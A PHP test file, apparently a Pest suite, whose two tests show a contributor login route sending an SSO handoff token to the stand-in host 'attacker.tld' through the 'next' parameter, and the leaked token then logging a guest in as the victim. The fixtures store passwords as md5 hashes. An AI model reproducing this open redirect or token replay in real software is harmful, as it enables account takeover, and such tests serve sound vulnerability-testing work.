<?php

use App\Models\User;

test('contributor login forwards the sso handoff token to an attacker-controlled host', function () {
    $user = User::factory()->create([
        'legacy_password' => md5('secret123'),
    ]);

    $response = $this->post('/contributor-login', [
        'email' => $user->email,
        'password' => 'secret123',
        'next' => 'https://attacker.tld/collect',
    ]);

    $location = $response->headers->get('Location');

    expect($location)->toStartWith('https://attacker.tld/collect');
    expect($location)->toContain('sso=');
    $this->assertAuthenticatedAs($user);
});

test('a leaked sso handoff link authenticates the bearer as the victim', function () {
    $victim = User::factory()->create([
        'legacy_password' => md5('secret123'),
    ]);

    $login = $this->post('/contributor-login', [
        'email' => $victim->email,
        'password' => 'secret123',
        'next' => 'https://attacker.tld/collect',
    ]);

    parse_str(parse_url($login->headers->get('Location'), PHP_URL_QUERY), $query);
    $stolenLink = $query['sso'];

    // The attacker replays the leaked link from their own (guest) session.
    auth()->logout();
    $this->assertGuest();

    $this->get($stolenLink)->assertRedirect('/admin');

    $this->assertAuthenticatedAs($victim);
});
